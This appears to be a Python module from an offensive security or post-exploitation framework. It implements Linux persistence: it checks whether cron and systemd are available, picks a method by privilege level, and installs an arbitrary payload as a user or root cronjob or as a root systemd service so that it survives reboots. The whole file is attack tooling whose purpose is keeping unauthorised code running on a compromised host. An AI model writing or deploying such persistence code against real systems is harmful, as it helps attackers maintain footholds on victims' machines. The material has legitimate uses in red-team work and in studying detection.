"""
linux.py: Linux-specific persistence logic.
"""

import subprocess

from .base                                import Persistence

from .linux_utilities.persistence_methods import LinuxPersistenceMethods
from .linux_utilities.systemd             import createService

from .unix_utilities.permissions          import UnixPrivilege
from .unix_utilities.cronjob              import Cronjob


class LinuxPersistence(Persistence):
    """
    Linux-specific persistence logic.

    identifier: Effective user ID of the user to install the payload as.
    """
    def __init__(self, payload: str, identifier: int, custom_method: str = None) -> None:
        super().__init__(payload, identifier, custom_method)

        # Inherited from Persistence class:
        self.payload
        self.identifier
        self.custom_method
        self.temp_dir
        self.recommended_method

        super().__post_init__()


    def __is_method_available(self, method: str) -> bool:
        """
        Check if the persistence method is available on the system.
        """
        # Check if cron is enabled.
        if method in [
            LinuxPersistenceMethods.CRONJOB_USER.value,
            LinuxPersistenceMethods.CRONJOB_ROOT.value
        ]:
            return subprocess.run(["systemctl", "is-enabled", "cron"], capture_output=True).returncode == 0

        # Check if host is systemd-based.
        if method == LinuxPersistenceMethods.SYSTEMDSERVICE_ROOT.value:
            # Reference: https://superuser.com/questions/1017959/how-to-know-if-i-am-using-systemd-on-linux
            if "systemd" == subprocess.run(["ps", "-p", "1", "-o", "comm="], capture_output=True).stdout.decode().strip():
                return True
            return False

        raise NotImplementedError(f"Method {method} not implemented.")


    def _determine_recommended_persistence_method(self) -> str:
        supported_methods = self.supported_persistence_methods()
        if self.identifier == UnixPrivilege.ROOT.value:
            if LinuxPersistenceMethods.CRONJOB_ROOT.value in supported_methods:
                return LinuxPersistenceMethods.CRONJOB_ROOT.value

        if LinuxPersistenceMethods.CRONJOB_USER.value in supported_methods:
            return LinuxPersistenceMethods.CRONJOB_USER.value

        return "No recommended method available."


    def supported_persistence_methods(self) -> list:

        methods = [method.value for method in LinuxPersistenceMethods]
        if self.identifier != UnixPrivilege.ROOT.value:
            methods.remove(LinuxPersistenceMethods.CRONJOB_ROOT.value)
            methods.remove(LinuxPersistenceMethods.SYSTEMDSERVICE_ROOT.value)

        if LinuxPersistenceMethods.CRONJOB_USER.value in methods:
            if self.__is_method_available(LinuxPersistenceMethods.CRONJOB_USER.value) is False:
                methods.remove(LinuxPersistenceMethods.CRONJOB_USER.value)
        if LinuxPersistenceMethods.SYSTEMDSERVICE_ROOT.value in methods:
            if self.__is_method_available(LinuxPersistenceMethods.SYSTEMDSERVICE_ROOT.value) is False:
                methods.remove(LinuxPersistenceMethods.SYSTEMDSERVICE_ROOT.value)

        return methods


    def install(self) -> None:
        method = self.configured_persistence_method()

        if method == LinuxPersistenceMethods.CRONJOB_USER.value:
            cronjob = Cronjob(self.payload)
            cronjob.install_current_user()
            return

        if method == LinuxPersistenceMethods.CRONJOB_ROOT.value:
            cronjob = Cronjob(self.payload)
            cronjob.install_root()
            return

        if method == LinuxPersistenceMethods.SYSTEMDSERVICE_ROOT.value:
            service = createService(self.payload)
            service.install()
            return

        raise NotImplementedError(f"Method {method} not implemented.")